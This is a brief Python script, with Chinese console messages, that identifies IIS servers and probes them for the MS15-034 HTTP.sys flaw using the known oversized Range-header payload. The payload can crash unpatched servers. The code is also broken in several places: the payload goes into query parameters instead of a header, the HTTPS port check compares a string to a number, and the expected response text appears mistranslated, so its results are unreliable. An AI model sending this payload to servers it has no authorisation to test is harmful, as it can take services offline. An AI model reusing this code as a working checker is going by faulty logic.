# -*- coding: utf-8 -*-     
import requests
import sys
import re
def identify_iis(domain):

    req = requests.get(str(domain))

    remote_server = req.headers['server']

    if "Microsoft-IIS" in remote_server:

        print('[+] 服务是' + remote_server)

        ms15_034_test(str(domain))

    else:
        print('[-] 服务器不是IIS\n可能是: ' + remote_server)
def ms15_034_test(domain):

    print("启动vuln检查！")

    vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"

    req = requests.get(str(domain), params=vuln_buffer)

    #print(req.content);

    if "请求范围不符合" in req.content:

        print('[+] 存在漏洞')

    else:

        print('[-] IIS服务无法显示漏洞是否存在，需要手动检测')
if __name__== '__main__':
    if len(sys.argv) == 3:        
        target = sys.argv[1]
        port = sys.argv[2]
        if port == 443:
            protocal = "https"
        else:
            protocal = "http"
        usr_domain = protocal + "://"+target+":"+str(port)
        identify_iis(usr_domain)
